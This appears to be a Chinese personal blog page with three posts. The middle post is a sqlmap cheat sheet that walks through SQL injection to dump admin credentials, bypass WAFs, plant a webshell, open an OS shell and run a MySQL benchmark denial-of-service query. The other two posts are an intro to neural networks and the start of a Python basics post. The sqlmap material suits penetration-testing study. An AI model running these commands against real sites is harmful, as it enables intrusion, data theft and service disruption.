<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>You&#39;s Tab</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Only talented people are qualified to say their dreams">
<meta property="og:type" content="website">
<meta property="og:title" content="You&#39;s Tab">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="You&#39;s Tab">
<meta property="og:description" content="Only talented people are qualified to say their dreams">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="You&#39;s Tab">
<meta name="twitter:description" content="Only talented people are qualified to say their dreams">
  
    <link rel="alternate" href="/atom.xml" title="You&#39;s Tab" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">You&#39;s Tab</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">Hobby and Life</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-神经网络" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/02/02/神经网络/" class="article-date">
  <time datetime="2018-02-02T06:17:09.000Z" itemprop="datePublished">2018-02-02</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/毕设/">毕设</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/02/02/神经网络/">神经网络</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="人工智能、机器学习、深度学习"><a href="#人工智能、机器学习、深度学习" class="headerlink" title="人工智能、机器学习、深度学习"></a>人工智能、机器学习、深度学习</h3><p>机器学习是实现人工智能的主要方式：人类基于机器学习和海量数据，逐步实现人工智能，其中深度学习是机器学习的一个分支。<br><img src="/2018/02/02/神经网络/../神经网络/rgjqsd.png" alt="人工智能、机器学习、深度学习"><br>人在一秒钟内做的决定，都可以由机器实现。而机器在一秒钟内，可以做成千上万个人在同时间内做的决定。</p>
<p>神经网络是将我们所知的一种特征，转换成另一种代表特征(计算机能识别的)，再转换成一种特征。<br>将数据传入到黑盒中，处理成计算机能识别的特征，再经过处理，转换成人类需要的特征。<br><img src="/2018/02/02/神经网络/../神经网络/szwlhh.png" alt="神经网络黑盒图"></p>
<h3 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h3><h6 id="1-有监督学习"><a href="#1-有监督学习" class="headerlink" title="1.有监督学习"></a>1.有监督学习</h6><p><img src="/2018/02/02/神经网络/../神经网络/yjdxx.png" alt="有监督学习图"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/02/02/神经网络/" data-id="cjdjy3u4e000l0c749lyrl259" class="article-share-link">Teilen</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/神经网络/">神经网络</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-sqlmap手册" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/25/sqlmap手册/" class="article-date">
  <time datetime="2018-01-25T13:50:41.000Z" itemprop="datePublished">2018-01-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Study/">Study</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/25/sqlmap手册/">sqlmap手册</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>sqlmap也是渗透中常用的一个注入工具，其实在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。<br>一共有11种常见SQLmap使用方法：</p>
<h3 id="一、SQLMAP用于Access数据库注入"><a href="#一、SQLMAP用于Access数据库注入" class="headerlink" title="一、SQLMAP用于Access数据库注入"></a>一、SQLMAP用于Access数据库注入</h3><h6 id="1-猜解是否能注入"><a href="#1-猜解是否能注入" class="headerlink" title="(1) 猜解是否能注入"></a>(1) 猜解是否能注入</h6><p>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="noopener">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“<br>Linux : .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="noopener">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“</p>
<h6 id="2-猜解表"><a href="#2-猜解表" class="headerlink" title="(2) 猜解表"></a>(2) 猜解表</h6><p>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;--tables" target="_blank" rel="noopener">http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;--tables</a><br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;--tables" target="_blank" rel="noopener">http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;--tables</a></p>
<h6 id="3-根据猜解的表进行猜解表的字段-假如通过2得到了admin这个表"><a href="#3-根据猜解的表进行猜解表的字段-假如通过2得到了admin这个表" class="headerlink" title="(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)"></a>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</h6><p>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;--columns" target="_blank" rel="noopener">http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;--columns</a> -T admin<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;--columns" target="_blank" rel="noopener">http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;--columns</a> -T admin</p>
<h6 id="4-根据字段猜解内容-假如通过3得到字段为username和password"><a href="#4-根据字段猜解内容-假如通过3得到字段为username和password" class="headerlink" title="(4) 根据字段猜解内容(假如通过3得到字段为username和password)"></a>(4) 根据字段猜解内容(假如通过3得到字段为username和password)</h6><p>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;--dump" target="_blank" rel="noopener">http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;--dump</a> -T admin -C “username,password”<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;--dump" target="_blank" rel="noopener">http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;--dump</a> -T admin -C<br>“username,Bpassword”</p>
<h3 id="二、SQLMAP用于Cookie注入"><a href="#二、SQLMAP用于Cookie注入" class="headerlink" title="二、SQLMAP用于Cookie注入"></a>二、SQLMAP用于Cookie注入</h3><h6 id="1-cookie注入，猜解表"><a href="#1-cookie注入，猜解表" class="headerlink" title="(1) cookie注入，猜解表"></a>(1) cookie注入，猜解表</h6><p>win : python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp&quot;--cookie" target="_blank" rel="noopener">http://www.xxx.org/jsj/shownews.asp&quot;--cookie</a> “id=31” –table –level 2</p>
<h6 id="2-猜解字段，-通过1的表猜解字段，假如表为admin"><a href="#2-猜解字段，-通过1的表猜解字段，假如表为admin" class="headerlink" title="(2) 猜解字段，(通过1的表猜解字段，假如表为admin)"></a>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)</h6><p>win :python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp&quot;--cookie" target="_blank" rel="noopener">http://www.xxx.org/jsj/shownews.asp&quot;--cookie</a> “id=31” –columns -T<br>admin –level 2</p>
<h6 id="3-猜解内容"><a href="#3-猜解内容" class="headerlink" title="(3) 猜解内容"></a>(3) 猜解内容</h6><p>win :python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp&quot;--cookie" target="_blank" rel="noopener">http://www.xxx.org/jsj/shownews.asp&quot;--cookie</a> “id=31” –dump -T<br>admin -C “username,password” –level 2</p>
<h3 id="三、SQLMAP用于mysql中DDOS攻击"><a href="#三、SQLMAP用于mysql中DDOS攻击" class="headerlink" title="三、SQLMAP用于mysql中DDOS攻击"></a>三、SQLMAP用于mysql中DDOS攻击</h3><h6 id="1-获取一个Shell"><a href="#1-获取一个Shell" class="headerlink" title="(1) 获取一个Shell"></a>(1) 获取一个Shell</h6><p>win:<br>python sqlmap.py -u<a href="http://192.168.159.1/news.php?id=1--sql-shell" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1--sql-shell</a><br>Linux:<br>sqlmap -u<a href="http://192.168.159.1/news.php?id=1--sql-shell" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1--sql-shell</a></p>
<h6 id="2-输入执行语句完成DDOS攻击"><a href="#2-输入执行语句完成DDOS攻击" class="headerlink" title="(2) 输入执行语句完成DDOS攻击"></a>(2) 输入执行语句完成DDOS攻击</h6><p>select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</p>
<h3 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h3><h6 id="1-查找数据库"><a href="#1-查找数据库" class="headerlink" title="(1) 查找数据库"></a>(1) 查找数据库</h6><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;--dbs" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;--dbs</a></p>
<h6 id="2-通过第一步的数据库查找表-假如数据库名为dataname"><a href="#2-通过第一步的数据库查找表-假如数据库名为dataname" class="headerlink" title="(2) 通过第一步的数据库查找表(假如数据库名为dataname)"></a>(2) 通过第一步的数据库查找表(假如数据库名为dataname)</h6><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;-D" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;-D</a> dataname –tables</p>
<h6 id="3-通过2中的表得出列名-假如表为table-name"><a href="#3-通过2中的表得出列名-假如表为table-name" class="headerlink" title="(3) 通过2中的表得出列名(假如表为table_name)"></a>(3) 通过2中的表得出列名(假如表为table_name)</h6><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;-D" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;-D</a> dataname -T table_name –columns</p>
<h6 id="4-获取字段的值-假如扫描出id-user-password字段"><a href="#4-获取字段的值-假如扫描出id-user-password字段" class="headerlink" title="(4) 获取字段的值(假如扫描出id,user,password字段)"></a>(4) 获取字段的值(假如扫描出id,user,password字段)</h6><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;-D" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;-D</a> dataname -T table_name -C<br>“id,user,password” –dump</p>
<h3 id="五、SQLMAP中post登陆框注入"><a href="#五、SQLMAP中post登陆框注入" class="headerlink" title="五、SQLMAP中post登陆框注入"></a>五、SQLMAP中post登陆框注入</h3><h6 id="1-其中的search-test-txt是通过抓包工具burp-suite抓到的包并把数据保存为这个txt文件我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。"><a href="#1-其中的search-test-txt是通过抓包工具burp-suite抓到的包并把数据保存为这个txt文件我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。" class="headerlink" title="(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。"></a>(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</h6><ol>
<li>浏览器打开目标地址http:// www.xxx.com /Login.asp</li>
<li>配置burp代理(127.0.0.1:8080)以拦截请求</li>
<li>点击login表单的submit按钮</li>
<li>这时候Burp会拦截到了我们的登录POST请求</li>
<li>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</li>
<li>运行sqlmap并使用如下命令：<br>./sqlmap.py -r search-test.txt -p tfUPass<br>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。<br>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp</a><br>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass<h6 id="2-自动的搜索"><a href="#2-自动的搜索" class="headerlink" title="(2) 自动的搜索"></a>(2) 自动的搜索</h6>sqlmap -u<a href="http://testasp.vulnweb.com/Login.asp--forms" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp--forms</a><h6 id="3-指定参数搜索"><a href="#3-指定参数搜索" class="headerlink" title="(3) 指定参数搜索"></a>(3) 指定参数搜索</h6><h6 id="sqlmap-uhttp-testasp-vulnweb-com-Login-asp-data-“tfUName-321-amp-tfUPass-321”"><a href="#sqlmap-uhttp-testasp-vulnweb-com-Login-asp-data-“tfUName-321-amp-tfUPass-321”" class="headerlink" title="sqlmap -uhttp://testasp.vulnweb.com/Login.asp--data “tfUName=321&amp;tfUPass=321”"></a>sqlmap -u<a href="http://testasp.vulnweb.com/Login.asp--data" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp--data</a> “tfUName=321&amp;tfUPass=321”</h6><h3 id="六、SQLMAP中Google搜索注入"><a href="#六、SQLMAP中Google搜索注入" class="headerlink" title="六、SQLMAP中Google搜索注入"></a>六、SQLMAP中Google搜索注入</h3>inurl后面的语言是由自己定的<br>注入过程中如果选y是注入，如果不是选n<br>sqlmap -g inurl:php?id=<h3 id="七、SQLMAP中的请求延迟"><a href="#七、SQLMAP中的请求延迟" class="headerlink" title="七、SQLMAP中的请求延迟"></a>七、SQLMAP中的请求延迟</h3>参数 –delay –safe-freq<br>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/</a> … ot%3B–delay 1<br>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/</a> … ot%3B–safe-freq 3<br>参数<h3 id="八、SQLMAP绕过WAF防火墙"><a href="#八、SQLMAP绕过WAF防火墙" class="headerlink" title="八、SQLMAP绕过WAF防火墙"></a>八、SQLMAP绕过WAF防火墙</h3>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a><br>sqlmap -u<a href="http://192.168.159.1/news.php?id=1-v" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1-v</a> 3 –dbs –batch –tamper “space2morehash.py”<br>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py<br>都是编码方式<br>space2hash.py base64encode.py charencode.py<h3 id="九、SQLMAP查看权限"><a href="#九、SQLMAP查看权限" class="headerlink" title="九、SQLMAP查看权限"></a>九、SQLMAP查看权限</h3>sqlmap -u<a href="http://192.168.159.1/news.php?id=1--privileges" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1--privileges</a><h3 id="十、SQLMAP伪静态注入"><a href="#十、SQLMAP伪静态注入" class="headerlink" title="十、SQLMAP伪静态注入"></a>十、SQLMAP伪静态注入</h3>######(1) 查找数据库<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/</a> … ot%3B–dbs<h6 id="2-通过1中的数据库查找对应的表-假如通过1，得到的是dataname"><a href="#2-通过1中的数据库查找对应的表-假如通过1，得到的是dataname" class="headerlink" title="(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)"></a>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)</h6>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/</a> … ot%3B-D dataname –tables<h6 id="3-通过2中的数据表得到字段-假如得到的是tablename表"><a href="#3-通过2中的数据表得到字段-假如得到的是tablename表" class="headerlink" title="(3) 通过2中的数据表得到字段(假如得到的是tablename表)"></a>(3) 通过2中的数据表得到字段(假如得到的是tablename表)</h6>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/</a> … ot%3B-D dataname -T<br>tablename –columns<h6 id="4-通过3得到字段值-假如从3中得到字段id，password"><a href="#4-通过3得到字段值-假如从3中得到字段id，password" class="headerlink" title="(4) 通过3得到字段值(假如从3中得到字段id，password)"></a>(4) 通过3得到字段值(假如从3中得到字段id，password)</h6>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/</a> … ot%3B-D dataname -T<br>tablename -C “password” –dump<h3 id="十一、SQLMAP注入点执行命令与交互写shell"><a href="#十一、SQLMAP注入点执行命令与交互写shell" class="headerlink" title="十一、SQLMAP注入点执行命令与交互写shell"></a>十一、SQLMAP注入点执行命令与交互写shell</h3><h6 id="1-注入点：http-192-168-159-1-news-php-id-1"><a href="#1-注入点：http-192-168-159-1-news-php-id-1" class="headerlink" title="(1) 注入点：http://192.168.159.1/news.php?id=1"></a>(1) 注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a></h6>此处采用的是Linux系统<br>sqlmap -u<a href="http://192.168.159.1/news.php?id=1--os-cmd=ipconfig" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1--os-cmd=ipconfig</a><br>出现语言的选择根据实际的测试网站选择语言<br>指定目标站点D:/www/<h6 id="2-获取Shell"><a href="#2-获取Shell" class="headerlink" title="(2) 获取Shell"></a>(2) 获取Shell</h6>sqlmap -u<a href="http://192.168.159.1/news.php?id=1--os-shell" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1--os-shell</a><br>出现语言的选择根据实际的测试网站选择语言<br>指定目标站点D:/www/<br>输入ipconfig/all<br>创建用户和删除用户<br>只要权限足够大，你可以输入使用任何命令。<br>其他命令参考下面：<br>从数据库中搜索字段<br>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password<br>在dedecms数据库中搜索字段admin或者password。<br>读取与写入文件<br>首先找需要网站的物理路径，其次需要有可写或可读权限。<br>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br>/#示例：[<br>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”<br>使用shell命令：<br>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell<br>接下来指定网站可写目录：<br>“E:\php\htdocs\dvwa”<br>/#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）<br>sqlmap详细命令：<br>-is-dba 当前用户权限（是否为root权限）<br>-dbs 所有数据库<br>-current-db 网站当前数据库<br>-users 所有数据库用户<br>-current-user 当前数据库用户<br>-random-agent 构造随机user-agent<br>-passwords 数据库密码<br>-proxy<a href="http://local:8080–threads" target="_blank" rel="noopener">http://local:8080–threads</a> 10 (可以自定义线程加速) 代理<br>-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）<br>Options（选项）：<br>-version 显示程序的版本号并退出<br>-h, –help 显示此帮助消息并退出<br>-v VERBOSE 详细级别：0-6（默认为1）<br>Target（目标）：<br>以下至少需要设置其中一个选项，设置目标URL。<br>-d DIRECT 直接连接到数据库。<br>-u URL, –url=URL 目标URL。<br>-l LIST 从Burp或WebScarab代理的日志中解析目标。<br>-r REQUESTFILE 从一个文件中载入HTTP请求。<br>-g GOOGLEDORK 处理Google dork的结果作为目标URL。<br>-c CONFIGFILE 从INI配置文件中加载选项。<br>Request（请求）：<br>这些选项可以用来指定如何连接到目标URL。<br>-data=DATA 通过POST发送的数据字符串<br>-cookie=COOKIE HTTP Cookie头<br>-cookie-urlencode URL 编码生成的cookie注入<br>-drop-set-cookie 忽略响应的Set – Cookie头信息<br>-user-agent=AGENT 指定 HTTP User – Agent头<br>-random-agent 使用随机选定的HTTP User – Agent头<br>-referer=REFERER 指定 HTTP Referer头<br>-headers=HEADERS 换行分开，加入其他的HTTP头<br>-auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)<br>-auth-cred=ACRED HTTP身份验证凭据（用户名:密码）<br>-auth-cert=ACERT HTTP认证证书（key_file，cert_file）<br>-proxy=PROXY 使用HTTP代理连接到目标URL<br>-proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）<br>-ignore-proxy 忽略系统默认的HTTP代理<br>-delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒<br>-timeout=TIMEOUT 等待连接超时的时间（默认为30秒）<br>-retries=RETRIES 连接超时后重新连接的时间（默认3）<br>-scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式<br>-safe-url=SAFURL 在测试过程中经常访问的url地址<br>-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL<br>Enumeration（枚举）：<br>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。<br>-b, –banner 检索数据库管理系统的标识<br>-current-user 检索数据库管理系统当前用户<br>-current-db 检索数据库管理系统当前数据库<br>-is-dba 检测DBMS当前用户是否DBA<br>-users 枚举数据库管理系统用户<br>-passwords 枚举数据库管理系统用户密码哈希<br>-privileges 枚举数据库管理系统用户的权限<br>-roles 枚举数据库管理系统用户的角色<br>-dbs 枚举数据库管理系统数据库<br>-D DBname 要进行枚举的指定数据库名<br>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）<br>-tables 枚举的DBMS数据库中的表<br>-columns 枚举DBMS数据库表列<br>-dump 转储数据库管理系统的数据库中的表项<br>-dump-all 转储所有的DBMS数据库表中的条目<br>-search 搜索列（S），表（S）和/或数据库名称（S）<br>-C COL 要进行枚举的数据库列<br>-U USER 用来进行枚举的数据库用户<br>-exclude-sysdbs 枚举表时排除系统数据库<br>-start=LIMITSTART 第一个查询输出进入检索<br>-stop=LIMITSTOP 最后查询的输出进入检索<br>-first=FIRSTCHAR 第一个查询输出字的字符检索<br>-last=LASTCHAR 最后查询的输出字字符检索<br>-sql-query=QUERY 要执行的SQL语句<br>-sql-shell 提示交互式SQL的shell<br>Optimization（优化）：<br>这些选项可用于优化SqlMap的性能。<br>-o 开启所有优化开关<br>–predict-output 预测常见的查询输出<br>–keep-alive 使用持久的HTTP（S）连接<br>–null-connection 从没有实际的HTTP响应体中检索页面长度<br>–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）<br>Injection（注入）：<br>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。<br>-p TESTPARAMETER 可测试的参数（S）<br>–dbms=DBMS 强制后端的DBMS为此值<br>–os=OS 强制后端的DBMS操作系统为这个值<br>–prefix=PREFIX 注入payload字符串前缀<br>–suffix=SUFFIX 注入payload字符串后缀<br>–tamper=TAMPER 使用给定的脚本（S）篡改注入数据<br>Detection（检测）：<br>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。<br>–level=LEVEL 执行测试的等级（1-5，默认为1）<br>–risk=RISK 执行测试的风险（0-3，默认为1）<br>–string=STRING 查询时有效时在页面匹配字符串<br>–regexp=REGEXP 查询时有效时在页面匹配正则表达式<br>–text-only 仅基于在文本内容比较网页<br>Techniques（技巧）：这些选项可用于调整具体的SQL注入测试。<br>–technique=TECH SQL注入技术测试（默认BEUST）<br>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）<br>–union-cols=UCOLS 定列范围用于测试UNION查询注入<br>–union-char=UCHAR 用于暴力猜解列数的字符<br>Fingerprint（指纹）：-f, –fingerprint 执行检查广泛的DBMS版本指纹<br>Brute force（蛮力）：<br>这些选项可以被用来运行蛮力检查。<br>–common-tables 检查存在共同表<br>–common-columns 检查存在共同列<br>User-defined function injection（用户自定义函数注入）：<br>这些选项可以用来创建用户自定义函数。<br>–udf-inject 注入用户自定义函数<br>–shared-lib=SHLIB 共享库的本地路径<br>File system access（访问文件系统）：<br>这些选项可以被用来访问后端数据库管理系统的底层文件系统。<br>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件<br>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件<br>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br>Operating system access（操作系统访问）：<br>这些选项可以用于访问后端数据库管理系统的底层操作系统。<br>–os-cmd=OSCMD 执行操作系统命令<br>–os-shell 交互式的操作系统的shell<br>–os-pwn 获取一个OOB shell，meterpreter或VNC<br>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC<br>–os-bof 存储过程缓冲区溢出利用<br>–priv-esc 数据库进程用户权限提升<br>–msf-path=MSFPATH Metasploit Framework本地的安装路径<br>–tmp-path=TMPPATH 远程临时文件目录的绝对路径<br>Windows注册表访问：<br>这些选项可以被用来访问后端数据库管理系统Windows注册表。<br>–reg-read 读一个Windows注册表项值<br>–reg-add 写一个Windows注册表项值数据<br>–reg-del 删除Windows注册表键值<br>–reg-key=REGKEY Windows注册表键<br>–reg-value=REGVAL Windows注册表项值<br>–reg-data=REGDATA Windows注册表键值数据<br>–reg-type=REGTYPE Windows注册表项值类型<br>这些选项可以用来设置一些一般的工作参数。<br>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中<br>-s SESSIONFILE 保存和恢复检索会话文件的所有数据<br>–flush-session 刷新当前目标的会话文件<br>–fresh-queries 忽略在会话文件中存储的查询结果<br>–eta 显示每个输出的预计到达时间<br>–update 更新SqlMap<br>–save file保存选项到INI配置文件<br>–batch 从不询问用户输入，使用所有默认配置。<br>Miscellaneous（杂项）：<br>–beep 发现SQL注入时提醒<br>–check-payload IDS对注入payloads的检测测试<br>–cleanup SqlMap具体的UDF和表清理DBMS<br>–forms 对目标URL的解析和测试形式<br>–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果<br>–page-rank Google dork结果显示网页排名（PR）<br>–parse-errors 从响应页面解析数据库管理系统的错误消息<br>–replicate 复制转储的数据到一个sqlite3数据库<br>–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址<br>–wizard 给初级用户的简单向导界面</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/25/sqlmap手册/" data-id="cjdjy3u4a000k0c74nrdnt5zg" class="article-share-link">Teilen</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/">kali</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Python基础" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/24/Python基础/" class="article-date">
  <time datetime="2018-01-24T08:47:08.000Z" itemprop="datePublished">2018-01-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/毕设/">毕设</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/24/Python基础/">Python基础</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="由于毕设需要，短期内不再进行大量的java练习和学习，而是投入入侵检测和Python以及神经网络的学习中。好好毕业好吧。"><a href="#由于毕设需要，短期内不再进行大量的java练习和学习，而是投入入侵检测和Python以及神经网络的学习中。好好毕业好吧。" class="headerlink" title="由于毕设需要，短期内不再进行大量的java练习和学习，而是投入入侵检测和Python以及神经网络的学习中。好好毕业好吧。"></a>由于毕设需要，短期内不再进行大量的java练习和学习，而是投入入侵检测和Python以及神经网络的学习中。好好毕业好吧。</h1><p>Python和Java的一个区别，Python依靠排版来定义，而不是分号，所以Python排版不好会报错，句末加分号也会</p>
<h3 id="变量："><a href="#变量：" class="headerlink" title="变量："></a>变量：</h3><p>是一个Python和Java不同的地方，Java的定义方式是<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">123</span></span><br></pre></td></tr></table></figure></p>
